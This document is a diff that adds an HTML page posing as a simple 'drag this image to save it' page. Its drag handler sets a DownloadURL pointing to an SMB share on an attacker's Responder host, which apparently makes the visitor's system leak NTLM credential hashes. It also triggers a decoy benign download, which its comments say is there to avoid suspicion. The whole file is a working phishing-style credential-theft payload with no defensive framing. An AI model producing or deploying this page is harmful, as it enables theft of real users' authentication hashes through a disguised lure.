@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Save Your Image</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    img { cursor: grab; }
+  </style>
+</head>
+<body>
+  <h1>Drag this image to your desktop to save it</h1>
+  <img id="leak" src="https://example.com/benign.png" draggable="true"
+       ondragstart="leakHash(event)" alt="Draggable Image" width="200">
+
+  <script>
+    function leakHash(evt) {
+      // 1) Build a DownloadURL that points to an SMB share on your Responder box
+      //    Format: MIME:filename:file:///<ATTACKER_IP>/share/secret.txt
+      const mime     = 'application/octet-stream';
+      const filename = 'benign.png';
+      const attacker = 'file:////192.168.1.100/Share/secret.txt';
+
+      const downloadURL = `${mime}:${filename}:${attacker}`;
+      evt.dataTransfer.setData('DownloadURL', downloadURL);
+
+      // 2) (Optional) Trigger a benign download to avoid suspicion
+      const a = document.createElement('a');
+      a.href = evt.target.src;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  </script>
+</body>
+</html>
